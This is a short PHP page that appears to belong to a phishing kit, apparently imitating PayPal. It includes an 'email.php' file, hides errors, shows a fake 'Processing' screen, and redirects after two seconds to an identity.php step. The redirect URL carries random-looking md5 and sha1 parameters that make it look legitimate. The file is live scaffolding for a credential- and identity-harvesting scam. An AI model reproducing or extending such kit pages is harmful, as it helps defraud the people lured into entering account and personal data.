<?php
    error_reporting(0);
    ob_start();
    session_start();
    include '../email.php';
    header('refresh:2;identity.php?enc=' . md5(microtime()). '&dispatch=' .sha1(microtime()));
?>

<html>
<head>
    <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="Update" />
	<meta name="msapplication-task" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
	<title>proccess</title>
	<link rel="shortcut icon" href="../img/ppl.ico">
	<link rel="stylesheet" type="text/css" href="../css/poo.css">
</head>
<body>


   <div class="all" style="
    width: 160px;
    margin: 30% auto;
">
   	<span class="pr">Processing</span>
   	<img src="../img/loading-dots.gif">
   </div>

</body>
</html>